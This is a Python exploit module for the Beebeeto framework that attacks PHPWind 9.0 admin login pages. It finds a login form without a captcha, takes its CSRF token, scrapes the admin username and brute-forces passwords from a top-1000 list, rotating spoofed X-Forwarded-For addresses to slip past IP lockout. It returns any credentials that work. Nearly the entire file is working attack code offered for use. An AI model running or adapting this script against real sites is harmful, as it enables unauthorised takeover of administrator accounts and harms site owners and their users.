#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import random
import requests
import urlparse

import SETTINGS

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0017',
            'name': 'PHPWIND V9.0 X-Forwarded-For IP限制绕过导致可被爆破密码漏洞 Exploit',
            'author': 'user1018',
            'create_date': '2015-01-24',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpwind',
            'vul_version': ['9.0'],
            'type': 'Other',
            'tag': ['PHPWIND IP限制绕过漏洞', 'PHPWIND暴力破解漏洞', 'X-Forwarded-For', 'php'],
            'desc': 'PHPWIND v9.0 /admin.php or /windid/admin.php IP修改XFF绕过登录限制漏洞。',
            'references': ['N/A',
            ],
        },
    }


    @staticmethod
    def get_login_info(url, args):
        """
        1. Obtain the url without verification code.
        2. Obtain the csrf_token.
        """
        try:
            windid_ver_check, admin_ver_check = 1, 1 # Verification code
            csrf_token_re = re.compile(r'<input type="hidden" name="csrf_token" value="(.*)"/></form>')
            windid_url = '%s/windid/admin.php' % url
            windid_req = requests.get(windid_url)
            windid_content = windid_req.content
            if windid_req.status_code == 200:
                if 'id="J_admin_name" required name="username"' in windid_content:
                    if 'name="code" placeholder="请输入验证码"' not in windid_content:
                        windid_ver_check = 0
                        try:
                            csrf_token = csrf_token_re.findall(windid_content)[0]
                        except:
                            args['success'] = False
                            return args
                    else:
                        windid_ver_check = 1

            admin_url = '%s/admin.php' % url
            admin_req = requests.get(admin_url)
            admin_content = admin_req.content
            if admin_req.status_code == 200:
                if 'id="J_admin_name" required name="username"' in admin_content:
                    if 'name="code" placeholder="请输入验证码"' not in admin_content:
                        admin_ver_check = 0
                        try:
                            csrf_token = csrf_token_re.findall(admin_content)[0]
                        except:
                            args['success'] = False
                            return args
                    else:
                        admin_ver_check = 1
        except:
            args['success'] = False
            return args

        if windid_ver_check == 0:
            return windid_url, csrf_token
        elif admin_ver_check == 0:
            return admin_url, csrf_token
        return None, None


    @staticmethod
    def get_username(url, args):
        verify_url = '%s/index.php?m=space&uid=1' % url
        homepage = requests.get(verify_url).content
        user_re = re.compile(r'class="message J_qlogin_trigger J_send_msg_pop" data-name="(.*)"><em></em>')
        try:
            username = user_re.findall(homepage)[0]
        except:
            username = 'admin'
        return username


    @classmethod
    def exploit(cls, args):
        password_list = open('%s/utils/payload/password_top1000' % SETTINGS.FRAMEWORK_DIR, 'r')
        for pwd in password_list.readlines():
            url = args['options']['target']
            ver_url, csrf_token  = cls.get_login_info(url, args)
            ip = str(random.randint(1,244))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))
            headers_fake = {"Host": urlparse.urlparse(url).netloc,
                            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
                            "X-Forwarded-For": ip,
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Connection': 'keep-alive'}

            if ver_url and csrf_token:
                # Obtain username
                username = cls.get_username(url, args)
                # Brute func
                headers_fake['Cookie'] = 'csrf_token=%s' % csrf_token
                payload = 'username=%s&password=%s&submit=&csrf_token=%s' % (username, pwd.split()[0], csrf_token)
                if args['options']['verbose']:
                    print '[*] POST Username: %s' % username
                    print '[*] POST Password: %s' % pwd.split()[0]
                    print '[*] POST Payload: %s\n' % payload
                try:
                    req_content = requests.post('%s?a=login'%ver_url, data=payload, headers=headers_fake).content
                except:
                    continue
                if 'admin.php?a=logout" class=' in req_content:
                    args['success'] = True
                    args['poc_ret']['login_url'] = ver_url
                    args['poc_ret']['username'] = username
                    args['poc_ret']['password'] = pwd.split()[0]
                    return args
            else:
                args['success'] = False
                return args
        return args


    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())